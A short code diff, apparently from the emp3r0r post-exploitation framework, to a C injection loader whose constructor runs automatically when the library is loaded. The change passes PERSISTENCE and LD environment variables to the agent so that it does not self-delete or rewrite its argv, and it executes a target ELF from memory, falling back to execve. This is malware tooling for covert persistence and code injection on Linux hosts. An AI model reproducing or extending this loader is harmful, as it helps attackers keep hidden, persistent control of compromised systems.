@@ -15,6 +15,8 @@ void __attribute__((constructor)) initLibrary(void) {
     // prevent self delete of agent
     // see cmd/agent/main.go
     setenv("PERSISTENCE", "true", 1);
+    // tell agent not to change argv
+    setenv("LD", "true", 1);
 
     // where to read target ELF file
     // this should be in sync with emp3r0r inject_loader module
@@ -49,7 +51,8 @@ void __attribute__((constructor)) initLibrary(void) {
 
     // Run the ELF
     char *argv[] = {elf_path, NULL};
-    char *envv[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin", "HOME=/tmp", NULL};
+    char *envv[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin", "HOME=/tmp",
+                    "PERSISTENCE=true", "LD=true", NULL};
     if (elf_run(buf, argv, envv) < 0) {
       if (execve(elf_path, argv, envv) < 0) {
         perror("execve");
